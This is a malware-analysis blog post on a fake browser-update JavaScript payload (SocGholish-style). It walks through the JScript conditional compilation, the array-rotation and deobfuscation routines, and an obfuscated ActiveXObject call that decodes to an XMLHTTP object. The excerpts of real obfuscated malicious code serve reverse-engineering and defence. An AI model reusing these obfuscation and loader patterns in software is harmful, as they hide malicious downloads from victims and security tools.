<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="">
<meta name="description" content="In the previous post, &amp;ldquo;Fake Updates - Part 1&amp;rdquo;, I examined an infected website which claimed to require a browser update in order to properly function. Users who clicked on the download button would receive a JavaScript file to run on their system which would &amp;ldquo;update their browser&amp;rdquo;. I walked through the steps leading up to the download, and in this post will pick up where I left off and delve into the contents of the JavaScript payload." />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="https://rerednawyerg.github.io/malware-analysis/socgholish_part2/" />


    <title>
        
            Fake Updates - Part 2 :: RE and Analysis 
        
    </title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="/main.b19ba9188a25bac174ebc5046309f5deb58f12e32d6de3c78f054de31360b1a3.css">



    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="/favicon.ico">
    <meta name="msapplication-TileColor" content="">


<meta itemprop="name" content="Fake Updates - Part 2">
<meta itemprop="description" content="In the previous post, &ldquo;Fake Updates - Part 1&rdquo;, I examined an infected website which claimed to require a browser update in order to properly function. Users who clicked on the download button would receive a JavaScript file to run on their system which would &ldquo;update their browser&rdquo;. I walked through the steps leading up to the download, and in this post will pick up where I left off and delve into the contents of the JavaScript payload.">
<meta itemprop="datePublished" content="2023-01-23T19:47:27-06:00" />
<meta itemprop="dateModified" content="2023-01-23T19:47:27-06:00" />
<meta itemprop="wordCount" content="2162">



<meta itemprop="keywords" content="" />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Fake Updates - Part 2"/>
<meta name="twitter:description" content="In the previous post, &ldquo;Fake Updates - Part 1&rdquo;, I examined an infected website which claimed to require a browser update in order to properly function. Users who clicked on the download button would receive a JavaScript file to run on their system which would &ldquo;update their browser&rdquo;. I walked through the steps leading up to the download, and in this post will pick up where I left off and delve into the contents of the JavaScript payload."/>







    <meta property="article:published_time" content="2023-01-23 19:47:27 -0600 CST" />










    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text">rerednawyerg</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="/posts">About</a></li><li><a href="/malware-analysis">Malware Analysis</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="https://rerednawyerg.github.io/malware-analysis/socgholish_part2/">Fake Updates - Part 2</a></h2>

            
            
            

            <div class="post-content">
                <hr>
<p>In the previous post, &ldquo;Fake Updates - Part 1&rdquo;, I examined an infected website which claimed to require a browser update in order to properly function. Users who clicked on the download button would receive a JavaScript file to run on their system which would &ldquo;update their browser&rdquo;. I walked through the steps leading up to the download, and in this post will pick up where I left off and delve into the contents of the JavaScript payload.</p>
<hr>
<h3 id="first-look-at-the-payload">First Look At The Payload</h3>
<p>Cracking the JavaScript download open in SublimeText, it seems to be quite large and crammed together.</p>

    <img src="images/actual_first_of_blob.png"  alt="actual_first"  class="center"  />


<p>To make it easier to read, I ran it through an online JS beautifier, and turns out with the additional newlines and spaces, it is 1115 lines long.</p>

    <img src="images/first_of_blob.jpg"  alt="first"  class="center"  />


<p>When first looking at this, I saw what I thought were a few JavaScript block comments in the first line. After some Googling, I discovered these comments were actually conditional compilation keywords in JScript, the &ldquo;Microsoft version&rdquo; of JavaScript native to Windows. Checking some old documentation, conditional compilation allows for control of a script depending on the values of the conditional compilation variables. The <code>@cc_on</code> keyword activates conditional compilation support, and the <code>@if</code> and <code>@else</code> keywords function as a standard if/else statement.</p>
<p>The if statement in this sample checks the JScript version on the device and if the version is 4 or greater, enter the if statement, otherwise go into the very lengthy else statement.</p>
<p>Regarding the else statement - as mentioned previously it is over 1000 lines long and appears somewhat obfuscated. While the obfuscation is not particularly heavy, the process of renaming variables and functions to random characters (as seen in the above screenshot) was continued throughout. To avoid manually deobfuscating 1000 lines of JavaScript, I opted to take a few strings which didn&rsquo;t appear to be altered and Google them. Bingo - I found a JavaScript library called <a href="https://underscorejs.org/docs/underscore-esm.html">Underscore</a> which very closely matches the code in the <code>else</code> statement.</p>

    <img src="images/underscore.png"  alt="underscore"  class="center"  />


<p>Interesting, why would this be included as part of the downloaded &ldquo;fake update&rdquo; JavaScript payload? Scrolling quickly through the code, it does not appear to do anything overtly malicious. Running the code contained in the else statement through <a href="https://app.any.run/tasks/ef52f637-08c3-4429-8972-0889d3f31b3a/">any.run</a> doesn&rsquo;t show any obvious malicious indicators either.  All the code in the else statement seems to do is take the Underscore library, turn it into a function, and call the function in-place.</p>
<p>Another factor to weight is the else statement itself. The Underscore function code is only called if the device is running a JScript version older than 4.0. For reference, JScript version 4.0 was released in the late 1990s. It doesn&rsquo;t seem likely this payload would find itself on many devices with such an old version of JScript running.</p>
<p>If we consider these two statements to be true:</p>
<ul>
<li>The else section is not malicious (with the caveat that very light analysis was done to prove this)</li>
<li>The else section is not likely to ever be entered</li>
</ul>
<p>a few logical explanations remain regarding the code in the else statement.</p>
<ul>
<li>It was was included to increase the size of the download, possibly making it seem more legitimate.</li>
<li>The addition of &ldquo;legitimate&rdquo; code may have been an attempt at avoiding AV or other detection.</li>
<li>The mild obfuscation may have been an attempt to slow down or confuse researchers.</li>
</ul>
<p>To be quite honest, I am not sure why the content of the else statement was included. I may be missing something which a more seasoned analyst might have picked up on. Regardless, let&rsquo;s move on to the content of the <code>if</code> statement, where it seems the action is.</p>
<h3 id="jumping-into-the-if-statement">Jumping Into The IF Statement</h3>
<p>Below is the original content of the <code>if</code> statement in all its obfuscated glory, structurally beautified for easier reading. This is the section of code which would execute when a victim tries to update their browser by running the <code>Update.js</code> download.</p>
<p>Note - to better view these screenshots, I&rsquo;d recommend opening the image in a new tab and zooming in.</p>

    <img src="images/malicious_code.png"  alt="if_statement"  class="center"  />


<p>I worked my way through the content of the if/statement in SublimeText, performing text replacement on variables and functions to create more descriptive labels. I added a few comments as well.</p>

    <img src="images/cleaned_if_statement.png"  alt="if_cleaned"  class="center"  />


<p>Before I dive into some analysis, I will say I am not a JavaScript guru. In fact, many aspects of JS are a mystery to me. I do a lot of trial and error in Node on my Linux box to try and figure out what certain operators or snippets of code may do. With that said, I may be unable to give the real nitty-gritty technical reason as to why certain statements behaved the way they did, but I will present my best guess based on some testing, Googling, and common sense.</p>
<p>I&rsquo;m going to jump around a bit, starting with a function toward the bottom on lines 114-120, which I&rsquo;ve renamed to <code>get_array()</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JS" data-lang="JS"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">get_array</span>() {
    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">array</span> <span style="color:#f92672">=</span> [<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">array_values</span><span style="color:#f92672">&gt;</span>];
    <span style="color:#a6e22e">get_array</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">array</span>;
    };
    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">get_array</span>();
}
</code></pre></div><p>The function starts out by creating an array filled with random strings which may be base64 encoded, but don&rsquo;t decode to anything intelligible when testing manually.<br>
Next, the function redefines itself using something known in JavaScript as the <a href="http://peter.michaux.ca/articles/lazy-function-definition-pattern">Lazy Function Definition Pattern</a>. To summarize, when the function is called for the first time, it creates and returns the array variable. The next <code>n</code> times the function is called, it only <em>returns</em> the array variable, it is <strong>not</strong> recreated each time. If the array is updated in any way, these updates are permanent.</p>
<p>Moving back to lines 1-47, an anonymous, self-invoking function expression. JavaScript allows for functions to self-invoke, meaning they are called automatically, immediately after initialization with no need for function calls. Arguments are passed in via the parenthesis immediately following the function definition.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JS" data-lang="JS">(<span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">arg_get_array</span>, <span style="color:#a6e22e">_0x585212</span>) {
    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">strings_object</span> <span style="color:#f92672">=</span> {
            <span style="color:#a6e22e">_0x4e081b</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;gDB%&#39;</span>,
            <span style="color:#a6e22e">_0x4c3fe3</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3f6</span>,
            <span style="color:#a6e22e">_0x5f22db</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;PSgS&#39;</span>,
            <span style="color:#a6e22e">_0x4a3d3f</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3ea</span>,
            <span style="color:#a6e22e">_0x53d10b</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;YZM3&#39;</span>,
            <span style="color:#a6e22e">_0x1abe2b</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3ed</span>,
            <span style="color:#a6e22e">_0x38e02a</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;T^0n&#39;</span>,
            <span style="color:#a6e22e">_0x2eb8e4</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3eb</span>,
            <span style="color:#a6e22e">_0x234973</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;XVoi&#39;</span>,
            <span style="color:#a6e22e">_0x37e27f</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3e6</span>,
            <span style="color:#a6e22e">_0x6c65c0</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;KcYo&#39;</span>,
            <span style="color:#a6e22e">_0x259809</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3e4</span>,
            <span style="color:#a6e22e">_0x1c3c75</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;MW92&#39;</span>,
            <span style="color:#a6e22e">_0x560688</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3df</span>,
            <span style="color:#a6e22e">_0x23f8ea</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;YZM3&#39;</span>,
            <span style="color:#a6e22e">_0x185e90</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3dc</span>,
            <span style="color:#a6e22e">_0x4a0b3f</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;7#tp&#39;</span>,
            <span style="color:#a6e22e">_0x5af55a</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3da</span>,
            <span style="color:#a6e22e">_0x50eac5</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;$&amp;p#&#39;</span>,
            <span style="color:#a6e22e">_0x3f2c12</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3f8</span>,
            <span style="color:#a6e22e">_0x49bff8</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;R6OA&#39;</span>,
            <span style="color:#a6e22e">_0x540725</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3fc</span>
        },
        <span style="color:#a6e22e">solo_object</span> <span style="color:#f92672">=</span> {
            <span style="color:#a6e22e">_0x2bd82d</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x238</span>
        },
        <span style="color:#a6e22e">sub_get_array</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">arg_get_array</span>();

    <span style="color:#75715e">//passes arg2 minus 568 and arg1 to the deobfuscator() function and returns the result
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">arg1</span>, <span style="color:#a6e22e">arg2</span>) {
        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">deobfuscator</span>(<span style="color:#a6e22e">arg2</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">solo_object</span>.<span style="color:#a6e22e">_0x2bd82d</span>, <span style="color:#a6e22e">arg1</span>);
    }

    <span style="color:#66d9ef">while</span> (<span style="color:#f92672">!!</span>[]) {
        <span style="color:#66d9ef">try</span> {
            <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_0x4e9611</span> <span style="color:#f92672">=</span> parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x4e081b</span>, <span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x4c3fe3</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0x1</span> <span style="color:#f92672">*</span> (<span style="color:#f92672">-</span>parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x5f22db</span>, <span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x4a3d3f</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0x2</span>) <span style="color:#f92672">+</span> parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x53d10b</span>, <span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x1abe2b</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0x3</span> <span style="color:#f92672">+</span> parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x38e02a</span>, <span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x2eb8e4</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0x4</span> <span style="color:#f92672">*</span> (<span style="color:#f92672">-</span>parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x234973</span>, <span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x37e27f</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0x5</span>) <span style="color:#f92672">+</span> parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x6c65c0</span>, <span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x259809</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0x6</span> <span style="color:#f92672">*</span> (<span style="color:#f92672">-</span>parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x1c3c75</span>, <span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x560688</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0x7</span>) <span style="color:#f92672">+</span> <span style="color:#f92672">-</span>parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x23f8ea</span>, <span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x185e90</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0x8</span> <span style="color:#f92672">+</span> parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x4a0b3f</span>, <span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x5af55a</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0x9</span> <span style="color:#f92672">+</span> <span style="color:#f92672">-</span>parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x50eac5</span>, <span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x3f2c12</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0xa</span> <span style="color:#f92672">*</span> (<span style="color:#f92672">-</span>parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x49bff8</span>, <span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x540725</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0xb</span>);
            
            <span style="color:#75715e">//if result of above = 964931, then break and stop shifting array
</span><span style="color:#75715e"></span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">_0x4e9611</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">_0x585212</span>) <span style="color:#66d9ef">break</span>;
            <span style="color:#66d9ef">else</span> <span style="color:#a6e22e">sub_get_array</span>[<span style="color:#e6db74">&#39;push&#39;</span>](<span style="color:#a6e22e">sub_get_array</span>[<span style="color:#e6db74">&#39;shift&#39;</span>]());
        } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">_0x3f5ce4</span>) {
            <span style="color:#a6e22e">sub_get_array</span>[<span style="color:#e6db74">&#39;push&#39;</span>](<span style="color:#a6e22e">sub_get_array</span>[<span style="color:#e6db74">&#39;shift&#39;</span>]());
        }
    }
}(<span style="color:#a6e22e">get_array</span>, <span style="color:#ae81ff">0xeb943</span>));
</code></pre></div><p>There are two arguments passed to the anonymous function, the <code>get_array</code> function and the value <code>0xeb943</code>, which converting from base16 to base10 is 964931.<br>
The first thing the function does is define an object containing a set of key-value pairs. Looking closely at the KVs, they appear to follow a pattern: a random string and then a number in base16.<br>
The function then defines another object with a single key-value pair, with a value of 568 in base16. Next, the function assigns the <code>get_array</code> function (passed in as an argument) to <code>sub_get_array</code>.</p>
<p>After the variable creations are complete, a new function called <code>call_deobf</code> is created. The purpose of <code>call_deobf</code> is to take two arguments, subtract 568 from the second argument, and pass them both to another function, <code>deobfuscator()</code>. The <code>deobfuscator</code> function can be found in the previous screenshot from lines 62-112, and I&rsquo;ll go into detail regarding it in a separate section. For now, it is enough to know it returns a deobfuscated element from the array defined in <code>get_array</code>.</p>
<p>Up next, the while loop on line 36. In JavaScript, anything except for a specific list of items (0, -0, null, etc.) are considered &ldquo;truthy&rdquo;, meaning considered true when encountered in a boolean context. Thus, in JavaScript <code>[]</code> is truthy, and a double negation of a truthy value is also truthy. Therefore, this is a &ldquo;while true&rdquo; loop.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JS" data-lang="JS">    <span style="color:#66d9ef">while</span> (<span style="color:#f92672">!!</span>[]) {
        <span style="color:#66d9ef">try</span> {
            <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">while_breaker</span> <span style="color:#f92672">=</span> parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x4e081b</span>, <span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x4c3fe3</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0x1</span> <span style="color:#f92672">*</span> (<span style="color:#f92672">-</span>parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x5f22db</span>, <span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x4a3d3f</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0x2</span>) <span style="color:#f92672">+</span> parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x53d10b</span>, <span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x1abe2b</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0x3</span> <span style="color:#f92672">+</span> parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x38e02a</span>, <span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x2eb8e4</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0x4</span> <span style="color:#f92672">*</span> (<span style="color:#f92672">-</span>parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x234973</span>, <span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x37e27f</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0x5</span>) <span style="color:#f92672">+</span> parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x6c65c0</span>, <span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x259809</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0x6</span> <span style="color:#f92672">*</span> (<span style="color:#f92672">-</span>parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x1c3c75</span>, <span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x560688</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0x7</span>) <span style="color:#f92672">+</span> <span style="color:#f92672">-</span>parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x23f8ea</span>, <span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x185e90</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0x8</span> <span style="color:#f92672">+</span> parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x4a0b3f</span>, <span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x5af55a</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0x9</span> <span style="color:#f92672">+</span> <span style="color:#f92672">-</span>parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x50eac5</span>, <span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x3f2c12</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0xa</span> <span style="color:#f92672">*</span> (<span style="color:#f92672">-</span>parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x49bff8</span>, <span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x540725</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0xb</span>);
            
            <span style="color:#75715e">//if result of above == 964931, then break and stop shifting array
</span><span style="color:#75715e"></span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">while_breaker</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">_0x585212</span>) <span style="color:#66d9ef">break</span>;
            <span style="color:#66d9ef">else</span> <span style="color:#a6e22e">sub_get_array</span>[<span style="color:#e6db74">&#39;push&#39;</span>](<span style="color:#a6e22e">sub_get_array</span>[<span style="color:#e6db74">&#39;shift&#39;</span>]());
        } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">_0x3f5ce4</span>) {
            <span style="color:#a6e22e">sub_get_array</span>[<span style="color:#e6db74">&#39;push&#39;</span>](<span style="color:#a6e22e">sub_get_array</span>[<span style="color:#e6db74">&#39;shift&#39;</span>]());
        }
    } 
</code></pre></div><p>Starting in the <code>try</code> statement, the first thing the while loop does is create a variable, <code>while_breaker</code>, whose value is the result of a long, complex series of arithmetic operations and function calls. The following <code>if</code> statement checks to see whether <code>while_breaker</code> is strictly equal to the second argument of the main function, the number 964931.<br>
If they are equal, the while loop breaks and the end of the self-invoked function is reached. If they are not equal, the array removes its first element and passes the element to an invocation of &ldquo;push&rdquo; &ndash; effectively rotating the array by moving the first element of the array to the end of the array.<br>
If anything in the <code>try</code> statement fails, the array is still shifted in the <code>catch</code> statement.</p>
<p>In effect, the entire purpose of the self-invoked function is to take the array created by <code>get_array</code> and rotate it <code>X</code> number of times. When, and only when, it has been rotated the correct number of times will the <code>while_breaker</code> value be set to 964931 and the while loop break.</p>
<p>Moving on to the next important piece of the puzzle, the deobfuscator function.</p>
<h3 id="deobfuscator-function-and-beyond">Deobfuscator Function And Beyond</h3>
<p>I cleaned and notated the deobfuscator function enough to understand the basic behavior, but I will admit, there are some sections in which I did not spend a lot of time in the weeds. Specifically, the two functions defined within <code>deobfuscator</code> on lines 68 and 80, and their respective for-loops. In this case, it was enough to understand they perform &ldquo;some action&rdquo; on the arguments passed to them. No deep dive into the specific for-loop shenanigans necessary.<br>
With that said, I have provided comments as to my understanding of the deobfuscator function in the code screenshot, if interested. The quick and dirty explanation: using the <code>numeric_arg</code>, the function grabs a value from the <code>get_array</code> array. It modifies the <code>array_value</code> function using a more complex series of functions, and returns a value.</p>
<p>Now we can finally get to the payload finale, the real important stuff &ndash; lines 50, 51, 52, and 122.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JS" data-lang="JS"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">activex_object</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#a6e22e">call_deobf_2</span>(<span style="color:#e6db74">&#39;7FM9&#39;</span>, <span style="color:#ae81ff">0x2a1</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">call_deobf_2</span>(<span style="color:#e6db74">&#39;@f0l&#39;</span>, <span style="color:#ae81ff">0x2a3</span>));
<span style="color:#a6e22e">activex_object</span>[<span style="color:#a6e22e">call_deobf_2</span>(<span style="color:#e6db74">&#39;@f0l&#39;</span>, <span style="color:#ae81ff">0x293</span>)](<span style="color:#a6e22e">call_deobf_2</span>(<span style="color:#e6db74">&#39;7#tp&#39;</span>, <span style="color:#ae81ff">0x28a</span>), <span style="color:#a6e22e">call_deobf_2</span>(<span style="color:#e6db74">&#39;Yu2X&#39;</span>, <span style="color:#ae81ff">0x2a0</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">call_deobf_2</span>(<span style="color:#e6db74">&#39;Fo89&#39;</span>, <span style="color:#ae81ff">0x2ab</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">call_deobf_2</span>(<span style="color:#e6db74">&#39;HSRT&#39;</span>, <span style="color:#ae81ff">0x2a9</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">call_deobf_2</span>(<span style="color:#e6db74">&#39;jlDe&#39;</span>, <span style="color:#ae81ff">0x29f</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">call_deobf_2</span>(<span style="color:#e6db74">&#39;oRu9&#39;</span>, <span style="color:#ae81ff">0x287</span>), <span style="color:#f92672">!</span>[]), 
<span style="color:#a6e22e">activex_object</span>[<span style="color:#a6e22e">call_deobf_2</span>(<span style="color:#e6db74">&#39;HC5I&#39;</span>, <span style="color:#ae81ff">0x285</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">call_deobf_2</span>(<span style="color:#e6db74">&#39;)X0A&#39;</span>, <span style="color:#ae81ff">0x2a7</span>)](<span style="color:#a6e22e">call_deobf_2</span>(<span style="color:#e6db74">&#39;O)P#&#39;</span>, <span style="color:#ae81ff">0x2aa</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">call_deobf_2</span>(<span style="color:#e6db74">&#39;HSRT&#39;</span>, <span style="color:#ae81ff">0x2ac</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">call_deobf_2</span>(<span style="color:#e6db74">&#39;@9eY&#39;</span>, <span style="color:#ae81ff">0x28e</span>), <span style="color:#e6db74">&#39;1&#39;</span>);
</code></pre></div><p>Starting with the first two lines, we can see an ActiveXObject is being created, but the argument passed in is the result of two function calls. How can we determine what this value may be?</p>
<p>Since I know the purpose of the <code>get_array</code> and <code>deobfuscator</code> functions is &ldquo;benign&rdquo; (not directly executing malicious code), I can start up a Node REPL (Read-Eval-Print-Loop) session to play with the JavaScript dynamically. To do this, simply enter <code>node</code> in the command prompt, provided Node.js is installed on the device.</p>
<p>Once here, I pasted the two functions into REPL, as it will save functions for the duration of the session.<br>
Then, I pasted the entire anonymous, self-invoking function into REPL as well, since I know all it does it rotate the array. Perfect, now all we need to do is paste lines 54-59 (a function which calls <code>deobfuscator</code> I named <code>call_deobf_2</code>) into REPL and I can start manually deobfuscating.</p>

    <img src="images/node_example.png"  alt="node_example"  class="center"  />


<p>So, now we know line 50 is actually</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JS" data-lang="JS"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">activex_object</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#39;MSXML2.XMLHTTP&#39;</span>)
</code></pre></div><p>and is exactly how to define an XMLHTTP object, which provides client-side protocol support for communication with HTTP servers.</p>
